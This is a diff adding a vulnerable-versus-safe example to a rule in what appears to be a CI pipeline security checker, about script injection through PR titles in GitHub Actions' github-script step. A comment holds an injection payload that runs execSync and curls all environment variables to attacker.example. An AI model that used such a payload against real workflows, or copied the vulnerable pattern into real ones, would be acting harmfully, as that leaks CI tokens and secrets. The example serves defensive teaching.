@@ -43,6 +43,36 @@ RULE = Rule(
         "rely on a non-curated context, suppress with a brief "
         "``.pipelinecheckignore`` rationale.",
     ),
+    exploit_example=(
+        "# Vulnerable: a PR title containing\n"
+        "#   `;require('child_process').execSync('curl https://attacker.example/-d \"$(env)\"');//\n"
+        "# closes the surrounding string, runs Node code against the\n"
+        "# workflow's GITHUB_TOKEN, and exfiltrates every env var.\n"
+        "jobs:\n"
+        "  comment:\n"
+        "    runs-on: ubuntu-latest\n"
+        "    steps:\n"
+        "      - uses: actions/github-script@<sha>\n"
+        "        with:\n"
+        "          script: |\n"
+        "            const title = `${{ github.event.pull_request.title }}`;\n"
+        "            await github.rest.issues.createComment({ body: title });\n"
+        "\n"
+        "# Safe: route the value through env so Node sees it as a\n"
+        "# string, never as JavaScript source.\n"
+        "jobs:\n"
+        "  comment:\n"
+        "    runs-on: ubuntu-latest\n"
+        "    steps:\n"
+        "      - uses: actions/github-script@<sha>\n"
+        "        env:\n"
+        "          PR_TITLE: ${{ github.event.pull_request.title }}\n"
+        "        with:\n"
+        "          script: |\n"
+        "            await github.rest.issues.createComment({\n"
+        "              body: process.env.PR_TITLE,\n"
+        "            });"
+    ),
 )
 
 
